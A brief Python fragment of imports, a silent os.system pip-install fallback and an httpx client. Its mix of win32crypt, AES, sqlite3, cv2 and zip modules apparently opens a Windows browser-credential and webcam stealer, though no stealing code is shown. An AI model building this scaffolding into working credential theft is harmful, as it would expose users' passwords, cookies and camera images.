import os

try:
    import cv2
    from zipfile import ZipFile
    from httpx import Client
    import sqlite3, win32crypt, base64, json, datetime, shutil
    from Crypto.Cipher import AES
except:
    os.system("pip install httpx datetime zipfile36 pypiwin32 pycrypto opencv-python")

session = Client()